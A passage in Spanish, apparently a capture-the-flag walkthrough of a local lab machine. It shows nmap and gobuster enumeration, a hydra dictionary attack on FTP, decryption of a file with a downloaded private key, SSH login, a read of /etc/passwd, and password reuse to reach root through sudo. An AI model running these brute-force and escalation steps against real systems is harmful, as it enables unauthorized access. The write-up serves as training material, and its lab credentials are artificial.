@@ -1,0 +1,120 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+
+si chequeamos el servicio web, solo nos conseguimos con el siguiente texto:
+
+Welcome mwheeler!!
+
+# Fuzzing Web
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 300
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 231]
+/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+
+===============================================================
+
+volvemos a fuzzear en en http://172.17.0.2/strange/ ya que a priori no consigo nada
+
+gobuster dir -u http://172.17.0.2/strange -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,html,py,js,png,jpg -t 200 2>/dev/null
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 3040]
+/private.txt          (Status: 200) [Size: 64]
+/secret.html          (Status: 200) [Size: 172]
+/.html                (Status: 403) [Size: 275]
+===============================================================
+
+si reviso en http://172.17.0.2/strange/secret.html me consigo con el siguiente mensaje:
+__________________________________________________________________
+El usuario ftp es admin, pero la contraseña es...
+Debes descubrirlo
+Una pista: ¡El diccionario rockyou es correcto para su uso!
+__________________________________________________________________
+
+ahora nos descargamos el archivo en /private.txt
+
+curl -O http://172.17.0.2/strange//private.txt
+
+si lo chequeamos, parece estar encriptado!
+__________________________________________________________________
+
+por ahora aplicare un ataque de diccionario para intentar
+conseguir la password del user admin por ftp
+
+hydra -l admin -P /home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt ftp://172.17.0.2 -t 25
+[21][ftp] host: 172.17.0.2   login: admin   password: banana
+
+conseguimos la password, asi que nos logueamos
+
+ftp 172.17.0.2
+Connected to 172.17.0.2.
+220 Welcome to my FTP server
+Name (172.17.0.2:darks): admin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ls
+-rwxr-xr-x    1 0        0             522 May 01 00:53 private_key.pem
+
+nos descargamos el archivo 
+
+get private_key.pem
+
+parece ser que el archivo .pem es la clave privada para desecriptar el contenido del
+archivo private.txt segun lo que pude aaveriguar por internet, haciendo uso de openssl
+asi que intentaare desencriptar el archivo private.txt
+
+
+openssl pkeyutl -decrypt -in private.txt -out decrypted.txt -inkey private_key.pem
+
+se genera un nuevo archivo (decrypted.txt) que tras leer su contenido nos conseguimos
+con lo siguiente:
+___________
+demogorgon
+___________
+
+no se que pueda ser, si una password o un user, pero la ire probando de diferentes formas...
+despues de varios intentos, recorde que lo primero que vimos cuando chequeamos el servicio web
+fue el siguente mensaje: Welcome mwheeler!!
+por lo que procedi a probar mwheeler como user y demogorgon como password del servicio ssh
+y logre el acceso
+
+
+# Escalada de privilegios
+
+sudo -l					| no podemos ejecutarlo
+find / -perm -4000 2>/dev/null		| nada por aqui
+cat /etc/passwd
+
+tras leer el archivo /etc/passwd vemos que existe un user admin como el de ftp, y como
+no he conseguido alguna forma para escalar a root, probare las credenciales de ftp 
+con el user admin del sistema
+
+su admin
+pass:banana
+whoami
+admin
+sudo -l
+    (ALL) ALL
+
+podemos ejecutar cualquier comando como root asi que para escalar a root:
+
+sudo su
+#root
